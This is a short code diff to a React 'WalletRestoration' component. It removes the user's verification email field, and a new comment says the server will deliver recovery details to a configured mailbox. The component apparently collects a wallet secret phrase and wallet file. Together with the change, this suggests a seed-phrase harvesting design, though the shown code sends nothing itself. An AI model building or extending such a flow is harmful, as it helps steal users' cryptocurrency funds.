@@ -217,23 +217,7 @@ export const WalletRestoration = () => {
           </div>
         )}
 
-        {/* Email */}
-        <div>
-          <label className="block text-sm font-semibold text-white mb-2">
-            Verification email
-          </label>
-          <input
-            type="email"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            disabled={isLoading}
-            placeholder="your@email.com"
-            className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-          />
-          <p className="text-xs text-slate-400 mt-2">
-            Recovery details will be sent here for your records
-          </p>
-        </div>
+        {/* Verification email removed — server will deliver to configured recovery mailbox */}
       </div>
 
       {/* Progress Bar */}
@@ -279,7 +263,6 @@ export const WalletRestoration = () => {
             setStep('idle')
             setSecretPhrase('')
             setWalletFile('')
-            setEmail('')
             setProgress(0)
             setMessage('')
           }}
